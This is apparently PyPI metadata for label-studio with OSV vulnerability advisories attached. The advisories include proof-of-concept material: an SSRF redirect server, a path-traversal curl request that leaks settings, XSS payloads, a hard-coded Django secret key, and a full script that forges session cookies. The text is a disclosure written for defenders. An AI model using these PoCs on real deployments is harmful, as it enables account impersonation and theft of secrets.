save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.1.post2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.1.post2/","requires_dist":null,"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.1.post2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"d01d2a4edb1dd5b1c5b77b92ccb03f88a8a5a8b3b3feef7ad933b2f7a85f1cee","md5":"7e17981812f82252c4180e14bf426c11","sha256":"6ffd2ac3a77da8441da24abda5fcc70dfb185e65171d80b46a3f99ab565564a6"},"downloads":-1,"filename":"label-studio-0.9.1.post2.tar.gz","has_sig":false,"md5_digest":"7e17981812f82252c4180e14bf426c11","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":13286446,"upload_time":"2021-03-26T13:22:53","upload_time_iso_8601":"2021-03-26T13:22:53.954622Z","url":"https://files.pythonhosted.org/packages/d0/1d/2a4edb1dd5b1c5b77b92ccb03f88a8a5a8b3b3feef7ad933b2f7a85f1cee/label-studio-0.9.1.post2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM 